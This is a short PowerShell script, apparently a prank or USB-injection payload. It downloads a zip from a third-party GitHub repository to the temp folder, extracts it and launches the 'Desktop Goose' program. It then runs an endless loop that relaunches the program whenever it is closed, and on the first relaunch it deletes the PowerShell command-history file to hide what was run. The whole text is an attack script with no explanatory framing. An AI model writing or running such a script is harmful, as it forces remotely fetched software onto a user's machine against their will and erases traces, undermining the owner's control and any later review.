$url = "https://github.com/Akeydeys/Install/raw/main/Desktop%20Goose%20v0.31.zip"

$destination = [System.IO.Path]::Combine($env:TEMP, "Desktop-Goose-v0.31.zip")

Iwr -Uri $url -OutFile $destination

$extractedFolder = [System.IO.Path]::Combine($env:TEMP, "Desktop-Goose-v0.31"); Expand-Archive -Path $destination -DestinationPath $extractedFolder

Remove-Item -Path $destination -Force

$gooseDesktopPath = Get-ChildItem -Path $extractedFolder -Recurse -Filter "GooseDesktop.exe" | Select-Object -First 1

Start-Sleep -Seconds 3

Start-Process -FilePath $gooseDesktopPath.FullName -ErrorAction SilentlyContinue

$historyRemoved = $false

$historyRemoved = $false

while ($true) { 
    if (-not (Get-Process -Name "GooseDesktop" -ErrorAction SilentlyContinue)) { 
        Start-Process -FilePath $gooseDesktopPath.FullName 
        if (-not $historyRemoved) { 
            Remove-Item (Get-PSReadlineOption).HistorySavePath -Force 
            $historyRemoved = $true
        } 
    } 
    Start-Sleep -Seconds 3 
}